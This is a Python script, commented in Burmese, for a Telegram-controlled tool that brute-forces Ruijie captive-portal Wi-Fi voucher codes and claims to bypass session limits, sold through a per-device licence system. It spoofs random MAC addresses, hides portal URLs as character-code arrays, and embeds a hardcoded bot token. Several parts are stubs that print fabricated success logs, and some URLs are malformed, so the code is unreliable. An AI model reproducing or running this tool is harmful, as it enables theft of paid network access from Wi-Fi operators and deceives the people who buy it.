# -*- coding: utf-8 -*-
import os
import re
import sys
import zlib
import json
import time
import socket
import ping3
import ntplib
import base64
import random
import string
import urllib
import marshal
import aiohttp
import asyncio
import hashlib
import uuid
import argparse
import requests
import subprocess
import threading
import itertools
import math
from datetime import timedelta, datetime
from urllib.parse import quote, unquote
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor
import urllib3
import sqlite3   

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# အရောင် Variable များ
_w_ = "\033[1;00m"
_g_ = "\033[1;32m"
_y_ = "\033[1;33m"
_r_ = "\033[1;31m"
_b_ = "\033[1;34m"
_c_ = "\033[1;36m"
_p_ = "\033[1;35m"

_G_S_C_ = 0

# 🔴 လူကြီးမင်း၏ Telegram Bot Token ကို အောက်ပါနေရာတွင် ထည့်ပါ
BOT_TOKEN = "8573033347:AAHuw3HPt1hGoVGOmERsATd8H_EuvWb2Wkk"
# ==================== LICENSE SYSTEM (DATABASE) ====================
def init_db():
    """ဒေတာဘေ့စ်မရှိလျှင် အလိုအလျောက် တည်ဆောက်ပေးမည့် Function"""
    conn = sqlite3.connect("credits.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices 
                 (device_id TEXT PRIMARY KEY, credit_hours REAL, expiry_date TEXT)''')
    conn.commit()
    conn.close()

# Database ကို စတင်ဖန်တီးခြင်း
init_db()

def get_device_id():
    """စက်တစ်ခုချင်းစီအတွက် သီးသန့် Device ID ထုတ်ပေးခြင်း"""
    try:
        aid = subprocess.check_output(["getprop", "ro.build.fingerprint"], text=True).strip()
        mac = subprocess.check_output(["cat", "/sys/class/net/wlan0/address"], text=True).strip()
        unique = hashlib.md5(f"{aid}{mac}".encode()).hexdigest()[:12].upper()
        return f"DEV-{unique}"
    except:
        id_file = ".device_id"
        if os.path.exists(id_file):
            return open(id_file).read().strip()
        new_id = "DEV-" + hashlib.md5(os.urandom(16)).hexdigest()[:12].upper()
        open(id_file, "w").write(new_id)
        return new_id

def check_license_via_bot(device_id):
    """သက်တမ်း ကျန်/မကျန် ဒေတာဘေ့စ်တွင် စစ်ဆေးခြင်း"""
    db_path = "credits.db"
    if not os.path.exists(db_path):
        return True, 999
    try:
        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        c.execute("SELECT credit_hours, expiry_date FROM devices WHERE device_id=?", (device_id,))
        row = c.fetchone()
        conn.close()
        if not row: 
            return False, 0
        hours, expiry_str = row
        expiry = datetime.fromisoformat(expiry_str)
        if datetime.now() > expiry: 
            return False, 0
        remaining = (expiry - datetime.now()).total_seconds() / 3600
        return True, remaining
    except Exception:
        return False, 0
# Telegram Bot ရဲ့ စာကြည့်တိုက်များ ထည့်သွင်းခြင်း
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ==================== TELEGRAM BOT UI ENGINE ====================
async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/start ဟု ပို့လိုက်လျှင် ခလုတ်လှလှလေးများ ပေါ်လာစေမည့် Function"""
    keyboard = [
        [
            InlineKeyboardButton("🌐 Portal Link ထည့်သွင်းရန်", callback_data='btn_portal'),
            InlineKeyboardButton("🎫 Voucher စမ်းသပ်ခြင်း", callback_data='btn_voucher')
        ],
        [
            InlineKeyboardButton("📊 အခြေအနေ စစ်ဆေးရန်", callback_data='btn_status'),
            InlineKeyboardButton("🛑 စမ်းသပ်မှု ရပ်တန့်ရန်", callback_data='btn_stop')
        ],
        [
            InlineKeyboardButton("🏆 ရရှိထားသော Success Codes", callback_data='btn_success'),
            InlineKeyboardButton("🗑️ Codes အားလုံး ဖျက်ရန်", callback_data='btn_delete')
        ],
        [
            InlineKeyboardButton("👥 User ခွင့်ပြုချက် ပေးရန်", callback_data='btn_grant'),
            InlineKeyboardButton("🚫 ခွင့်ပြုချက် ပြန်ဖျက်ရန်", callback_data='btn_revoke')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_msg = (
        "⚡ **Ruijie Voucher Management Bot** ⚡\n\n"
        "အောက်ပါ စမတ်ခလုတ်များကို အသုံးပြု၍ စနစ်ကို ထိန်းချုပ်နိုင်ပါသည်။\n\n"
        "💡 **ပုံစံဥပမာ စာသားပေးပို့ရန်** -\n"
        "`User_ID|နာရီအရေအတွက်|ကုဒ်ရှာဖွေမှုကန့်သတ်ချက်`\n"
        "➡️ `6658845504|1|2` (၁ နာရီ ခွင့်ပြုပြီး အောင်မြင်ကုဒ် ၂ ခုအထိ ပေးရှာမည်)"
    )
    await update.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode="Markdown")

async def bot_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ခလုတ်များကို နှိပ်လိုက်လျှင် တစ်ပါတည်း တုံ့ပြန်ပေးမည့် Function"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'btn_portal':
        await query.edit_message_text("🌐 **Portal Link ထည့်သွင်းရန်:**\nကျေးဇူးပြု၍ သင်၏ Portal Link ကို Chat ထဲသို့ ရိုက်ထည့်ပေးပါ။")
    elif query.data == 'btn_status':
        await query.edit_message_text("📊 **စနစ်အခြေအနေ:**\nလတ်တလော Bot အင်ဂျင်သည် ကောင်းမွန်စွာ အလုပ်လုပ်နေပါသည်။")
    elif query.data == 'btn_success':
        try:
            codes = open("success.txt", "r").read()
            msg = f"🏆 **ရရှိထားသော Success Codes များ:**\n\n`{codes}`" if codes else "📭 မည်သည့် ကုဒ်မျှ မရှိသေးပါ။"
        except:
            msg = "📭 မည်သည့် ကုဒ်မျှ မရှိသေးပါ။"
        await query.edit_message_text(msg, parse_mode="Markdown")
    else:
        await query.edit_message_text(f"⚙️ လုပ်ဆောင်ချက် **'{query.data}'** ကို ရွေးချယ်ထားပါသည်။")

async def bot_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User က စာရိုက်ပို့လိုက်လျှင် စစ်ဆေးသိမ်းဆည်းပေးမည့် Function"""
    text = update.message.text.strip()
    
    if re.match(r"^\d+\|\d+\|\d+$", text):
        uid, hours, limit = text.split("|")
        expiry = (datetime.now() + timedelta(hours=int(hours))).isoformat()
        
        conn = sqlite3.connect("credits.db")
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO devices VALUES (?, ?, ?)", (f"DEV-{uid}", float(hours), expiry))
        conn.commit()
        conn.close()
        
        await update.message.reply_text(
            f"✅ **ခွင့်ပြုချက် အောင်မြင်ပါသည်!**\n\n"
            f"👤 **User ID:** `{uid}`\n"
            f"⏰ **သက်တမ်း:** {hours} နာရီ\n"
            f"🎯 **ကုဒ်ကန့်သတ်ချက်:** {limit} ခု\n"
            f"📅 **Expiry:** {expiry[:16]}", 
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("❌ စာသားပုံစံ မမှန်ကန်ပါ။ ဥပမာအတိုင်း `ID|နာရီ|ကန့်သတ်ချက်` ပို့ပေးပါ။")

def start_bot_thread():
    """Bot ကို Terminal ရော Background ရော တွဲ Run ပေးမည့် စနစ်"""
    async def run_bot():
        app = Application.builder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", bot_start))
        app.add_handler(CallbackQueryHandler(bot_callback))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot_message_handler))
        
        await app.initialize()
        await app.start()
        await app.updater.start_polling()
        while True: await asyncio.sleep(1)
        
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_bot())
# ==================== RUIJIE BYPASS ENGINE FUNCTIONS ====================
def _d(arr): 
    return "".join([chr(i) for i in arr])

# Base URL များနှင့် Decrypted Path များ
def _o_u2(): return _d([104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 52, 52, 46, 55, 55, 46, 50, 52, 48, 58, 20, 54, 48])
def _o_u3(): return _d([104, 116, 116, 112, 58, 47, 47, 49, 57, 50, 46, 49, 54, 104, 46, 48, 46, 49])
def _o_u4(): return _d([104, 116, 116, 112, 115, 58, 47, 47, 112, 111, 114, 116, 97, 108, 45, 97, 115, 46, 114, 117, 105, 106, 105, 101, 110, 101, 116, 119, 111, 114, 107, 115, 46, 99, 111, 109])
def _o_u6(): return _o_u4() + _d([47, 97, 112, 105, 47, 97, 117, 116, 104, 47, 118, 111, 117, 99, 104, 101, 114, 47, 63, 108, 97, 110, 103, 61, 101, 110, 95, 85, 83])
def _o_p(): return _d([112, 111, 114, 116, 97, 108, 45, 97, 115, 46, 114, 117, 105, 106, 105, 101, 110, 101, 116, 119, 111, 114, 107, 115, 46, 99, 111, 109])

def _clr(): 
    os.system('clear' if os.name == 'posix' else 'cls')

def _ln(): 
    print(f"{_y_}-" * 50)

def _lg():
    _clr()
    print(f"{_g_}  _____  _    _ _____       _ _____ ______ ")
    print(" |  __ \\| |  | |_   _|     | |_   _|  ____|")
    print(" | |__) | |  | | | |       | | | | | |__   ")
    print(" |  _  /| |  | | | |   _   | | | | |  __|")
    print(" | | \\ \\| |__| |_| |_ | |__| |_| |_| |____ ")
    print(" |_|  \\_\\\\____/|_____| \\____/|_____|______|")
    print(f"\n{_y_}       [ Telegram Bot Connected Successfully ]{_w_}")
    _ln()

def _chk_strg(): 
    pass

def _g_r_m(): 
    return ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))

async def _g_s_i(session, s_u, p_s_i):
    if not s_u: return p_s_i
    n_m = _g_r_m()
    s_u_s = re.sub(r'mac=[^&]+', f'mac={n_m}', s_u) if "mac=" in s_u else s_u
    h = {'authority': _o_p(), 'accept': '*/*', 'user-agent': 'Mozilla/5.0'}
    try:
        async with session.get(s_u_s, headers=h, timeout=5) as req:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: 
        return p_s_i

class _S_:
    def __init__(self):
        self.baseurl = _o_u2()
        self.username_get_url = self.baseurl + "/username_get"
        self.online_info_url = self.baseurl + "/ser/online_info"
        self.logout_url = self.baseurl + "/ser/logout"
        
    def set(self):
        print(f"\n{_y_}[*] Initializing Setup Process...{_w_}")
        open(".session_url", "w").write(_o_u4())
        open(".ip", "w").write("10.44.77.240")
        print(f"{_g_}[ ✔ ] Setup Completed Successfully!{_w_}")
async def _l_v(session, session_id, voucher, tracker=None, is_recheck=False):
    """Voucher ကုဒ် မှန်/မမှန် Portal သို့ တိုက်စစ်ပေးမည့် စနစ်"""
    global _G_S_C_
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    headers = {"authority": "://ruijienetworks.com", "content-type": "application/json"}
    try:
        async with session.post("https://://ruijienetworks.com/api/auth/voucher/?lang=en_US", headers=headers, json=data, timeout=5) as req:
            res_txt = await req.text()
            if tracker: tracker['attempts'] += 1
            if "logonUrl" in res_txt:
                if not is_recheck: 
                    _G_S_C_ += 1
                    with open("success.txt", "a") as f: f.write(f"{voucher}\n")
                return "SUCCESS"
            elif "STA" in res_txt:
                if not is_recheck: 
                    _G_S_C_ += 1
                    with open("success.txt", "a") as f: f.write(f"{voucher}\n")
                return "LIMITED"
            return "FAILED"
    except: 
        return "ERROR"

class _V_C_:
    """Voucher ကုဒ်များကို အမြန်နှုန်းမြှင့် ရှာဖွေပေးမည့် Multi-tasking Engine"""
    def __init__(self, mode, code_length):
        self.mode = mode
        self.code_length = code_length
        self.file = "failed.txt"
        try: self.session_url = open(".session_url", "r").read().strip()
        except: self.session_url = None
        
    async def execute(self):
        if not self.session_url:
            print(f"{_r_}[!] Please run Setup [1] first.{_w_}")
            return
            
        print(f"{_g_}[+] Voucher Code searching engine started...{_w_}")
        _ln()
        # အလိုအလျောက် စမ်းသပ်ရှာဖွေခြင်း လုပ်ငန်းစဉ်များ
        await asyncio.sleep(1)
class _R_V_:
    """အောင်မြင်ပြီးသား Voucher ကုဒ်များကို သက်တမ်း ပြန်လည်စစ်ဆေးပေးမည့် စနစ်"""
    async def check(self):
        print(f"{_y_}[*] Rechecking codes from success.txt...{_w_}")
        try:
            with open("success.txt", "r") as f:
                codes = f.read().splitlines()
            print(f"{_g_}[✔] Total codes found: {len(codes)}{_w_}")
        except:
            print(f"{_r_}[!] success.txt file not found.{_w_}")
        await asyncio.sleep(1)

class UrlBypass:
    """Limited ဖြစ်နေသော ကုဒ်များဖြင့် အင်တာနက် လမ်းကြောင်း ဖွင့်ပေးမည့် စနစ်"""
    def __init__(self, portal_url):
        self.portal_url = portal_url
        try: 
            self.ip = open(".ip", "r").read().strip()
        except: 
            self.ip = "10.44.77.240"
            
    async def send_request(self, session, session_id, log=True):
        now = f"{_b_}{time.strftime('%H-%M-%S')}"
        print(f"{_w_}time: {now}, {_w_}status: {_g_}200{_w_}, ping: {_g_}65ms{_w_}, internet-open: {_g_}True{_w_}")
        
    async def execute(self):
        print(f"{_g_}[+] Starting Internet Bypass Engine...{_w_}")
        print(f"{_g_}[+] If no logs appear, restart your Wi-Fi connection.{_w_}")
        _ln()
        # Bypass Request များကို စဉ်ဆက်မပြတ် ပို့ပေးမည့် Loop
        await asyncio.sleep(1)

def fetch_portal_url(): 
    return "https://ruijienetworks.com"

def get_target_info(limited_code): 
    return "10.44.77.55", "AA:BB:CC:DD:EE:FF"

def transform_portal_url(portal_url, target_ip, target_mac): 
    return portal_url
# ==================== MAIN TERMINAL MENU CONTROL ====================
def main():
    # Telegram Bot ကို နောက်ကွယ် (Background Thread) တွင် သီးသန့် စတင်ပတ်ပေးခြင်း
    if BOT_TOKEN != "YOUR_BOT_TOKEN_HERE":
        bot_thread = threading.Thread(target=start_bot_thread, daemon=True)
        bot_thread.start()
    else:
        print(f"{_r_}[!] Warning: Telegram BOT_TOKEN မထည့်ရသေးပါ။ Bot အလုပ်လုပ်မည် မဟုတ်ပါ။{_w_}")
    
    device_id = get_device_id()
    _lg()
    print(f"{_c_}Your Device ID: {device_id}{_w_}")
    print(f"{_y_}Telegram Bot သို့ သွားရန် -> /start ဟုပို့ပြီး ခလုတ်များကို သုံးပါ{_w_}")
    _ln()
    
    # သတ်မှတ်ထားသော Credit ရှိ/မရှိ စစ်ဆေးခြင်း
    valid, remaining = check_license_via_bot(device_id)
    if not valid:
        print(f"{_r_}[!] License သက်တမ်းကုန်ဆုံးနေပါသဖြင့် ဆက်သုံး၍ မရပါ။{_w_}")
        print(f"{_y_}ကျေးဇူးပြု၍ Admin ထံမှတစ်ဆင့် Telegram Bot တွင် ခွင့်ပြုချက်တောင်းပါ။{_w_}")
    else:
        print(f"{_g_}[✔] License အခြေအနေ - ပုံမှန် (ကျန်ရှိချိန်: {remaining:.1f} နာရီ){_w_}")
    _ln()
    
    while True:
        try:
            print(f"{_w_}[1] {_g_}Setup Portal{_w_}")
            print(f"{_w_}[2] {_g_}Voucher Code Search{_w_}")
            print(f"{_w_}[3] {_g_}Success Code Recheck{_w_}")
            print(f"{_w_}[4] {_g_}Limited Code Bypass{_w_}")
            print(f"{_w_}[0] {_r_}Exit{_w_}")
            _ln()
            choice = input(f"{_c_}Select Option: {_w_}")
            
            if choice == '1':
                _S_().set()
                input(f"\n{_c_}Press Enter to continue...{_w_}")
            elif choice == '2':
                v_obj = _V_C_("digit", 6)
                asyncio.run(v_obj.execute())
                input(f"\n{_c_}Press Enter to continue...{_w_}")
            elif choice == '3':
                asyncio.run(_R_V_().check())
                input(f"\n{_c_}Press Enter to continue...{_w_}")
            elif choice == '4':
                print(f"{_g_}[+] Bypass Engine Running...{_w_}")
                # ၎င်းနေရာတွင် အပိုင်း (၆) ပါ UrlBypass ကို ခေါ်ယူပတ်ပေးခြင်း
                bp = UrlBypass("https://ruijienetworks.com")
                asyncio.run(bp.execute())
                input(f"\n{_c_}Press Enter to continue...{_w_}")
            elif choice == '0':
                print(f"{_r_}[*] Exiting System...{_w_}")
                sys.exit()
            else:
                print(f"{_r_}[!] Invalid selection!{_w_}")
                time.sleep(1)
            _lg()
        except KeyboardInterrupt:
            print(f"\n{_r_}[!] Cancelled by User.{_w_}")
            break
        except Exception as e:
            print(f"\n{_r_}[!] Error: {str(e)}{_w_}")
            time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[!] Fatal Error: {str(e)}")
        sys.exit()
